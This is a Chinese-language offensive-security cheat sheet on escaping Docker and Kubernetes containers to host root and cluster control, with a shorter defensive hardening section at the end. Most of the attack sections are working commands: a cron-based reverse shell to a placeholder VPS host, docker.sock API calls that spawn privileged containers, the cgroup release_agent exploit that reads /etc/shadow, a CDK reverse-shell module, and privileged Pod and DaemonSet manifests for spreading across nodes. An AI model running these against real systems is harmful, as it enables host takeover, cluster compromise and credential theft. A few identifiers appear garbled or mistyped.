# 容器逃逸（Docker / Kubernetes）

## 一句话理解
攻击者已在容器内（通过 RCE / 入口拿下 web pod 或 docker 容器 shell），利用配置缺陷（privileged、危险挂载、高危 capabilities）或内核 / 运行时漏洞逃逸到宿主机，拿到宿主机 root 或整个集群控制权。

## 常见前提与危害
**前提**：已通过 Web 漏洞 / 反序列化拿到容器内 shell；容器以特权或危险配置运行，或内核 / runc / containerd 存在已知漏洞；K8s 下 Pod 挂载敏感 hostPath 或 SA 权限过大。
**危害**：宿主机 root；宿主上所有容器沦陷（邻居容器文件 / 环境变量 / 凭据全可读）；K8s 集群接管（特权 Pod / Daemonset 感染全部节点）；云凭据泄露 → 云账号接管（metadata、节点 IAM Role）。

## 前置：判断自己是否在容器内
```bash
cat /proc/1/cgroup | grep -E 'docker|kubepods'    # cgroup 特征，命中即容器
ls /.dockerenv                                      # Docker 环境标记（K8s 部分运行时没有）
cat /proc/self/mountinfo | grep -E 'docker|overlay'  # overlay 文件系统 + docker 挂载
env | grep KUBERNETES                               # K8s 环境变量（含 Service Account 信息）
hostname                                           # pod 名特征（hash 式长主机名）
```

判断特权容器（逃逸价值最高的信号）：
```bash
# 读取当前 effective capabilities 并解码
cat /proc/self/status | grep CapEff
# 安装 libcap 后解码：含 CAP_SYS_ADMIN / CAP_SYS_PTRACE 等即高危
capsh --decode=00000000a80425fb
# 最直接的特征：能列出宿主机磁盘 = privileged
fdisk -l
```
> CapEff 为全 1（如 000001ffffffffff）即近似 root 全能力，基本等价特权容器。

顺手收集的环境信息（决定后续走哪条路）：
```bash
cat /etc/os-release                                # 系统版本 → 匹配内核漏洞
uname -r                                           # 内核版本 → 匹配 DirtyPipe 等
ps aux                                             # 看得到宿主进程 = 共享 PID namespace（CAP_SYS_PTRACE 逃逸前提）
ls /var/run/secrets/kubernetes.io/serviceaccount/  # 存在 token 即可尝试 K8s 路径
ls -l /var/run/docker.sock /run/containerd/containerd.sock   # 检查运行时 socket 挂载
ip a                                               # 能看到宿主网卡 = host 网络模式（CVE-2020-15257 前提）
```

## 常见逃逸路径

### 1. privileged 特权容器
判断条件：`fdisk -l` 能看到宿主机磁盘、`capsh --decode` 含 `CAP_SYS_ADMIN`。

```bash
# 1. 看到宿主盘（/dev/vda1、/dev/sda1 等）
fdisk -l
# 2. 挂载宿主根分区
mkdir /mnt/host && mount /dev/vda1 /mnt/host
# 3. 进入宿主文件系统，直接读写宿主文件
chroot /mnt/host
# 4. 写宿主 root 计划任务反弹 shell（无需 chroot，路径写全即可）
echo '* * * * * /bin/bash -i >& /dev/tcp/VPS_IP/PORT 0>&1' > /mnt/host/var/spool/cron/crontabs/root
```
> 也可以写 `/mnt/host/root/.ssh/authorized_keys` 或替换宿主 SUID 程序，思路同"拿到宿主文件系统任意读写"。

### 2. 挂载 docker.sock
判断条件：`ls -l /var/run/docker.sock` 存在即命中（常见于 CI/CD、运维类容器）。

```bash
ls -l /var/run/docker.sock
```

方式一：容器内有 docker client（直接创建特权兄弟容器挂宿主根）：
```bash
docker -H unix:///var/run/docker.sock run -it -v /:/host --privileged alpine
# 进入后 chroot /host 即宿主 root
```

方式二：无 client 时直接走 HTTP API：
```bash
# 创建特权容器，绑定宿主根目录到 /host
curl --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["sleep","infinity"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create?name=pwned
# 启动它
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/pwned/start
# 再通过 exec API 拿交互（或干脆让 Cmd 直接执行反弹 shell）
```

### 3. hostPath 挂载宿主敏感目录（K8s）
判断条件：`cat /proc/self/mountinfo` 中出现 `/etc`、`/root`、`/var/run`、`/` 等宿主路径的 bind mount；或能读到的 pod spec 里有 hostPath。

```bash
# mountinfo 里看宿主路径挂载点（src 字段即宿主侧路径）
cat /proc/self/mountinfo | grep -vE 'overlay|proc|sys|cgroup|tmpfs'
```
- 挂了 `/` → 直接读写宿主全盘，等同路径 1
- 挂了 `/var/run` 或 `/var/run/docker.sock` → 回到路径 2
- 挂了 `/etc` → 可写 `/etc/shadow`、`/etc/crontab`、`/etc/ssh/sshd_config`
- 挂了 `/var/log` → 读取宿主日志、审计，收集更多信息

### 4. 危险 capabilities
判断条件：`capsh --decode` 后含下列任一能力。

**CAP_SYS_ADMIN（cgroup v1 release_agent，最经典）**：
```bash
# 前提：宿主使用 cgroup v1，且容器内可 mount（有 CAP_SYS_ADMIN）
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
# 找到容器在宿主文件系统上的真实路径
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
# release_agent 在宿主上以 root 执行我们指定的脚本
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd   # 示例：偷宿主 shadow
chmod a+x /cmd
# 触发：把自己的进程移出 cgroup 触发 release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

**CAP_SYS_PTRACE**：可与宿主进程共享 PID namespace 时注入宿主进程（`ps aux` 看得到宿主进程即命中），注入一个 root 进程执行 shellcode。

**CAP_DAC_READ_SEARCH**：绕过文件权限校验任意读宿主文件（配合宿主路径猜测/枚举，可读 `/etc/shadow`、其他容器配置）。

### 5. 内核漏洞
容器与宿主共享内核，容器内打内核漏洞 = 直接宿主 root：
- **DirtyCow（CVE-2016-5195）**：竞态写只读文件（写时复制竞态），可改宿主 SUID 程序或 `/etc/passwd`，范围极广但成功率受竞态影响
- **DirtyPipe（CVE-2022-0847）**：Linux 5.8+，管道缓冲区标志位缺陷可越权写任意可读文件（不能越权读），无竞态、稳定，可覆盖宿主 SUID 二进制；已修复于 5.16.11 / 5.15.25 / 5.10.102
- 其他常见：io_uring 系列、CVE-2017-1000112（UFO）等，按宿主内核版本选择
- POC 集合：https://github.com/SecWiki/linux-kernel-exploits

```bash
# 先看宿主内核版本，再决定用哪个洞（容器内 uname -r 即宿主内核）
uname -r
# 例如命中 5.8 <= kernel < 5.16.11 则可尝试 DirtyPipe 覆盖宿主 SUID 程序提权
```

### 6. runc CVE-2019-5736
判断条件：宿主 Docker < 18.09.2 / runc < 1.0-rc6，且有"再次 exec 进入容器"的动作（攻击者先在容器内把 `/proc/self/exe` 指向的 runc 替换为恶意文件，宿主管理员下次 `docker exec` 时即以宿主 root 执行恶意 runc）。
- POC：https://github.com/twistlock/RunC-CVE-2019-5736
- 一句话：利用 runc 打开 `/proc/self/exe` 后容器内可写此文件描述符，覆盖宿主机 runc 二进制

### 7. CVE-2020-15257（containerd shim 抽象 socket）
判断条件：containerd < 1.4.3 / < 1.3.9，容器与宿主在同一网络命名空间（`ip a` 能看到宿主网卡即命中，常见于 `--net=host`）。

```bash
# shim 通过 abstract unix socket 通信，网络命名空间内可达（ss 可看到 @/containerd-shim/...）
# 用现成工具直接接管 shim 创建特权新容器，实现逃逸
./cdk run shim-pwn reverse 127.0.0.1 4444
```
- 利用工具：[CDK](https://github.com/cdk-team/CDK) 内置 `shim-pwn` 模块

### 8. K8s Service Account 滥用
判断条件：`env | grep KUBERNETES` 有 Service 环境变量，且 `/var/run/secrets/kubernetes.io/serviceaccount/token` 存在。
> K8s API Server 攻击面、RBK枚举、创建 Pod 的完整玩法见 [PEN-Cloud](../penetration/PEN-Cloud.md) 的 K8s 攻击面章节（那里是入口）；本文聚焦"用 SA 逃逸到宿主"。

```bash
# 用 pod 内 token 自查权限（关键看能否 create pods）
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT auth can-i --list

# 权限允许时创建挂宿主根的特权 pod（nodeSelector 指定目标节点）
kubectl --token=... apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  nodeName: TARGET_NODE          # 直接指定节点
  hostPID: true
  privileged: true
  containers:
  - name: pwn
    image: alpine
    command: ["sleep","infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - {name: host, mountPath: /host}
  volumes:
  - name: host
    hostPath: {path: /}
EOF
```

## 提权后横向
拿到宿主 root 后的常规动作：
- `cat /etc/shadow` 离线破解，横向 SSH
- 读取宿主上 containerd/docker 数据目录：`/var/lib/containerd`、`/var/lib/docker`，导出邻居容器镜像 / 读取其内文件与环境变量（凭据）
- 读取宿主上的 K8s 组件凭据：`/etc/kubernetes/pki`、`/var/lib/kubelet/kubeconfig` → 直接以节点身份操作 API Server
- 读云 metadata（169.254.169.254）拿节点角色凭据 → 云控制面接管，完整利用见 [PEN-Cloud](../penetration/PEN-Cloud.md)
- K8s 场景一句话：**创建特权 Daemonset（挂 hostPath / + privileged + hostPID），随调度自动感染所有节点**：
```bash
kubectl apply -f - <<'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata: {name: spread}
spec:
  selector: {matchLabels: {app: spread}}
  template:
    metadata: {labels: {app: spread}}
    spec:
      hostPID: true
      containers:
      - name: pwn
        image: alpine
        command: ["/bin/sh","-c","sleep infinity"]
        securityContext: {privileged: true}
        volumeMounts: [{name: host, mountPath: /host}]
      volumes:
      - name: host
        hostPath: {path: /}
EOF
```

## 实战排查思路（防御侧）
- **基线检查**：
  - Docker 节点跑 [docker-bench-security](https://github.com/docker/docker-bench-security)
  - K8s 节点跑 [kube-bench](https://github.com/aquasecurity/kube-bench)（对照 CIS Benchmark）
- **高危配置审计**（准入层直接拦）：
  - 禁止 `privileged: true`（K8s 用准入控制器 / PSA 拦截）
  - hostPath 白名单（只允许日志采集等必要路径，禁止 `/`、`/etc`、`/root`、`/var/run`）
  - capabilities 最小化，默认 `drop: [ALL]`
- **运行时检测**：[Falco](https://github.com/falcosecurity/falco) 规则覆盖典型逃逸特征：
  - 容器内执行 `mount`、出现新 cgroup release_agent 写入
  - 容器内进程访问 `/var/run/docker.sock`
  - 容器内出现编译器 / 内核漏洞利用特征（如写 `/proc/self/exe`）
  - 特权容器创建、hostPath 敏感目录挂载
- **巡检命令**：定期扫各节点 `docker ps --format` 中 `--privileged`、`docker inspect` 检查 `Binds` / `CapAdd`
```bash
# 逐个检查容器的特权与挂载（输出非空即高危）
docker ps -q | xargs docker inspect --format \
  '{{.Name}} Priv={{.HostConfig.Privileged}} Binds={{.HostConfig.Binds}} Caps={{.HostConfig.CapAdd}}'
# K8s 侧列出所有挂了敏感 hostPath 的 pod
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.hostPath.path // "" | test("^/$|^/etc|^/root|^/var/run")) | "\(.metadata.namespace)/\(.metadata.name)"'
```

## 防御要点
- 容器一律非特权运行，禁止 `--privileged`
- 禁止挂载 `/`、docker.sock、/etc 等宿主敏感目录；必须挂载时用只读 `readOnly: true` + 最小路径
- `securityContext` 收敛：`capabilities: drop: [ALL]`、`allowPrivilegeEscalation: false`、`runAsNonRoot: true`
- 启用 seccomp（RuntimeDefault）与 AppArmor
- 内核、runc、containerd 及时补丁（尤其 CVE-2019-5736 / CVE-2020-1527 系列）
- Service Account 最小化：禁用 automountServiceAccountToken（非必需 pod）、RBAC 不给 `create pods/exec` 大权限
- K8s 启用 Pod Security Standards `restricted` 级别（替代已废弃的 PodSecurityPolicy）
- 高敏场景考虑沙箱运行时：gVisor / Kata Containers

## 速查清单
- 先确认在容器内：cgroup / .dockerenv / mountinfo / KUBERNETES 环境变量
- 再判断特权与能力：`CapEff` + `capsh --decode`、`fdisk -l`
- 按"命中即逃逸"顺序排查：privileged → docker.sock → hostPath → 危险 capabilities → SA token → 内核/运行时漏洞
- K8s 内优先试 SA token 创建特权 pod（无 RBAC 限制时最稳）
- 逃逸成功后：shadow / 邻居容器 / 云 metadata / 特权 Daemonset 横向
- 防御侧三件套：docker-bench-security + kube-bench 基线、Falco 运行时检测、PSA restricted 准入

## Reference
- https://github.com/cdk-team/CDK（CDK：容器逃逸 / K8s 渗透一体化利用工具）
- https://github.com/docker/docker-bench-security（Docker CIS 基线检查）
- https://github.com/aquasecurity/kube-bench（K8s CIS 基线检查）
- https://github.com/falcosecurity/falco（运行时逃逸检测）
- https://github.com/twistlock/RunC-CVE-2019-5736（runc 逃逸 POC）
- https://github.com/SecWiki/linux-kernel-exploits（内核漏洞 POC 集合）
- https://xz.aliyun.com/?tag=容器逃逸（先知社区：腾讯云容器逃逸系列文章）
- https://katacontainers.io/（Kata Containers 安全隔离运行时）
- https://kubernetes.io/docs/concepts/security/pod-security-standards/（Pod Security Standards 官方文档）
